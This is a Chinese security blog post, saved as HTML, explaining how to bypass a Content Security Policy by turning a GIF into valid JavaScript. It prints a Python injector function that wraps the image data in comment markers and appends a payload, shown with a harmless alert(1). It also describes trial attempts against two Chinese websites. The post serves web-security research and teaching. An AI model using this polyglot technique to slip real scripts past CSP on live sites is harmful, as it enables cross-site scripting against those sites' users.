@@ -1,0 +1,616 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>注入js到图片bypass CSP（猜想) | xd_xd&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="xd_xd">
+    
+
+    
+    <meta name="description" content="注入js到图片bypass CSP
+#相关资料：http://marcoramilli.blogspot.it/2013/10/hacking-through-images.htmlhttp://marcoramilli.blogspot.ru/2014/01/hacking-through-image-gif-turn.htmlhttps://github.com/wopot/jsgifkeyl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="注入js到图片bypass CSP（猜想)">
+<meta property="og:url" content="http://stayliv3.github.io/2015/04/10/csp绕过/index.html">
+<meta property="og:site_name" content="xd_xd's blog">
+<meta property="og:description" content="注入js到图片bypass CSP
+#相关资料：http://marcoramilli.blogspot.it/2013/10/hacking-through-images.htmlhttp://marcoramilli.blogspot.ru/2014/01/hacking-through-image-gif-turn.htmlhttps://github.com/wopot/jsgifkeyl">
+<meta property="og:image" content="http://stayliv3.github.io/images/csp1.jpg">
+<meta property="og:updated_time" content="2015-11-24T03:27:37.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="注入js到图片bypass CSP（猜想)">
+<meta name="twitter:description" content="注入js到图片bypass CSP
+#相关资料：http://marcoramilli.blogspot.it/2013/10/hacking-through-images.htmlhttp://marcoramilli.blogspot.ru/2014/01/hacking-through-image-gif-turn.htmlhttps://github.com/wopot/jsgifkeyl">
+
+    
+    <link rel="alternative" href="/atom.xml" title="xd_xd&#39;s blog" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css" type="text/css">
+</head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.png" alt="xd_xd&#39;s blog" title="xd_xd&#39;s blog"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="xd_xd&#39;s blog">xd_xd&#39;s blog</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
+						<input type="hidden" name="q" value="site:stayliv3.github.io">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2015/04/10/csp绕过/" title="注入js到图片bypass CSP（猜想)" itemprop="url">注入js到图片bypass CSP（猜想)</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="xd_xd" target="_blank" itemprop="author">xd_xd</a>
+		
+  <p class="article-time">
+    <time datetime="2015-04-10T10:25:51.000Z" itemprop="datePublished"> 发表于 Apr 10 2015</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目录</strong>
+		
+			
+		
+		</div>
+		
+		<p>注入js到图片bypass CSP</p>
+<p>#相关资料：<br><a href="http://marcoramilli.blogspot.it/2013/10/hacking-through-images.html" target="_blank" rel="external">http://marcoramilli.blogspot.it/2013/10/hacking-through-images.html</a><br><a href="http://marcoramilli.blogspot.ru/2014/01/hacking-through-image-gif-turn.html" target="_blank" rel="external">http://marcoramilli.blogspot.ru/2014/01/hacking-through-image-gif-turn.html</a><br><a href="https://github.com/wopot/jsgifkeylogger" target="_blank" rel="external">https://github.com/wopot/jsgifkeylogger</a></p>
+<p>#CSP简介</p>
+<p>内容安全策略（Content Security Policy，简称CSP）是一种以可信白名单作机制，来限制网站中是否可以包含某来源内容。</p>
+<p>比如知乎的响应头里有如下字段：</p>
+<pre><code>Content-Security-Policy: default-src <span class="keyword">*</span>; script-src <span class="keyword">*</span>.zhihu.com <span class="keyword">*</span>.google-analytics.com 'unsafe-eval'; 
+</code></pre><p>这样浏览器就只会加载来自<em>.zhihu.com，</em>。google-analytics.com的js文件。即使找到了一个好用的存储型XSS，也无法加载外域的js脚本。</p>
+<p>#注入js到图片文件</p>
+<p>很显然，如果我们可以在*.zhihu.com上上传一个js文件，xss就可以利用了。上传js文件的地方不好找，可是长传图片的地方却是很常见。一个图片能不能也是一个符合js语法的文件呢。下图说明是可以的。script标签的src属性是不限制资源后缀的，只要返回是合法的js代码即可。<br><img src="/images/csp1.jpg" alt="2"><br>关于如何让一个图片文件变成符合js语法的文件，已经有不少相关的研究了。可以参考文末的相关资料。这里提供两个在bmp和gif注入js的脚本（来源于参考资料，修复了原代码一处bug)。相关脚本下载：<a href="https://github.com/stayliv3/blog_material/tree/master/csp" target="_blank" rel="external">https://github.com/stayliv3/blog_material/tree/master/csp</a></p>
+<p>使用方法:</p>
+<pre><code>python jsingif<span class="class">.py</span> -<span class="tag">i</span> test<span class="class">.gif</span> <span class="string">"alert(1)"</span>
+</code></pre><p>#原理分析</p>
+<p>脚本中核心的函数如下：</p>
+<pre><code><span class="function"><span class="keyword">def</span> <span class="title">_inject_into_file</span><span class="params">(payload, fname)</span>:</span>
+<span class="string">"""
+Injects the payload into existing GIF
+NOTE: if the GIF contains \xFF\x2A and/or \x2A\x5C might caouse issues
+"""</span>
+<span class="comment"># I know, I can do it all in memory and much more fast.</span>
+<span class="comment"># I wont do it here.</span>
+<span class="keyword">with</span> open(fname + <span class="string">"_malw.gif"</span>, <span class="string">"w+b"</span>) <span class="keyword">as</span> fout:
+<span class="keyword">print</span> fname
+<span class="keyword">with</span> open(fname, <span class="string">"rb"</span>) <span class="keyword">as</span> fin:
+<span class="keyword">for</span> line <span class="keyword">in</span> fin:
+ls1 = line.replace(<span class="string">b'\x2A\x2F'</span>, <span class="string">b'\x00\x00'</span>)
+ls2 = ls1.replace(<span class="string">b'\x2F\x2A'</span>, <span class="string">b'\x00\x00'</span>)
+fout.write(ls2)
+fout.seek(<span class="number">6</span>,<span class="number">0</span>)
+fout.write(<span class="string">b'\x2F\x2A'</span>) <span class="comment">#/*</span>
+
+f = open(fname + <span class="string">"_malw.gif"</span>, <span class="string">"a+b"</span>) <span class="comment">#appending mode</span>
+f.write(<span class="string">b'\x2A\x2F\x3D\x31\x3B'</span>)
+f.write(payload)
+f.write(<span class="string">b'\x3B'</span>)
+f.close()
+<span class="keyword">return</span> <span class="keyword">True</span>
+</code></pre><p>\x2A\x2F对应js中的注释符号 <em>/<br>\x2F\x2A对应js中的注释符号 /</em><br>\x2A\x2F\x3D\x31\x3B 是*/=1;<br>\x3B 是;</p>
+<p>所以处理的过程是先把原gif文件中的\x2A\x2F和\x2F\x2A替换成\00以免破坏后面插入的注释符。<br>之后偏移6个字节，在gif文件头GIF89a后面插入/<em>,然后在文件末尾写入</em>/=1;写入payload,写入;</p>
+<p>所以文件处理完是这个样子的</p>
+<pre><code>GIF89a<span class="comment">/*gif图片数据*/</span>=<span class="number">1</span>;alert(<span class="number">1</span>);
+</code></pre><p>这样子就完全符合js的语法了。</p>
+<p>#实战测试</p>
+<p>发现知乎文件上传之后在zhimg.com域，不在CSP的白名单里。看来静态文件放在单独的域实在是一个很好的防御策略。然后想在蘑菇街上找个上传图片的地方，发现图片都被渲染了。膜拜黑哥多年以前的思路：</p>
+<pre><code>superhei&lt;<span class="number">0</span>x@<span class="number">557.</span>im&gt; <span class="number">19</span>:<span class="number">44</span>:<span class="number">41</span> 
+sns是意义在于 inside的里面很难防御 
+
+superhei&lt;<span class="number">0</span>x@<span class="number">557.</span>im&gt; <span class="number">19</span>:<span class="number">44</span>:<span class="number">53</span> 
+比如上传文件 
+</code></pre>  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://stayliv3.github.io/2015/04/10/csp绕过/" data-title="注入js到图片bypass CSP（猜想) | xd_xd&#39;s blog" data-tsina="null" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2015/04/11/HTTP响应的X-头部/" title="HTTP响应的X-头部">
+  <strong>上一篇：</strong><br/>
+  <span>
+  HTTP响应的X-头部</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2015/04/10/CSP遐想/"  title="CSP案例分析">
+ <strong>下一篇：</strong><br/> 
+ <span>CSP案例分析
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+<section id="comments" class="comment">
+	<div class="ds-thread" data-thread-key="2015/04/10/csp绕过/" data-title="注入js到图片bypass CSP（猜想)" data-url="http://stayliv3.github.io/2015/04/10/csp绕过/"></div>
+</section>
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">文章目录</strong>
+ 
+ 
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<aside class="clearfix">
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">分类</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/万物互联/" title="万物互联">万物互联<sup>7</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/代码审计/" title="代码审计">代码审计<sup>9</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/前端安全/" title="前端安全">前端安全<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/加密解密/" title="加密解密">加密解密<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/古典密码/" title="古典密码">古典密码<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/奇技淫巧/" title="奇技淫巧">奇技淫巧<sup>2</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/折腾不止/" title="折腾不止">折腾不止<sup>1</sup></a></li>
+		  
+		
+		  
+		
+		  
+			<li><a href="/categories/移动安全/" title="移动安全">移动安全<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/系统运维/" title="系统运维">系统运维<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/黑盒测试/" title="黑盒测试">黑盒测试<sup>6</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">标签</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/php/" title="php">php<sup>7</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/qemu/" title="qemu">qemu<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/sqlmap/" title="sqlmap">sqlmap<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/固件/" title="固件">固件<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/折腾/" title="折腾">折腾<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/tcpdump/" title="tcpdump">tcpdump<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/密码学/" title="密码学">密码学<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/加密解密/" title="加密解密">加密解密<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ctf/" title="ctf">ctf<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/docker/" title="docker">docker<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/逻辑漏洞/" title="逻辑漏洞">逻辑漏洞<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/php-wdcp/" title="php,wdcp">php,wdcp<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/解包/" title="解包">解包<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/mysql/" title="mysql">mysql<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/binwalk/" title="binwalk">binwalk<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/hackrf/" title="hackrf">hackrf<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/burpsuite/" title="burpsuite">burpsuite<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/brupsuite/" title="brupsuite">brupsuite<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Yii/" title="Yii">Yii<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/java/" title="java">java<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">友情链接</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="http://sco4x0.com" target="_blank" title="sco4x0&#39;s blog">sco4x0&#39;s blog</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://virusdefender.net" target="_blank" title="virusdefender&#39;s blog">virusdefender&#39;s blog</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.hackersb.cn/" target="_blank" title="Striker&#39;s blog">Striker&#39;s blog</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> Hello ,I&#39;m Larry Page in Google. <br/>
+			This is my blog,believe it or not.</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2015 
+		
+		<a href="/about" target="_blank" title="xd_xd">xd_xd</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+        getSize();
+        if (myWidth >= 1024) {
+          c.click();
+        }
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<a href="#" class="overlay" id="qrcode"></a>',
+  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#nothing"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+  $('.article-share-qrcode').click(function(){
+    var imgSrc = $('#qrcode-pic').attr('data-src');
+    $('#qrcode-pic').attr('src', imgSrc);
+    $('#qrcode-pic').load(function(){
+        $('.qrcode strong').text(' ');
+    });
+  });
+});     
+</script>
+
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"xdxd"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1253479891'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s23.cnzz.com/z_stat.php%3Fid%3D1253479891' type='text/javascript'%3E%3C/script%3E"));</script>
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
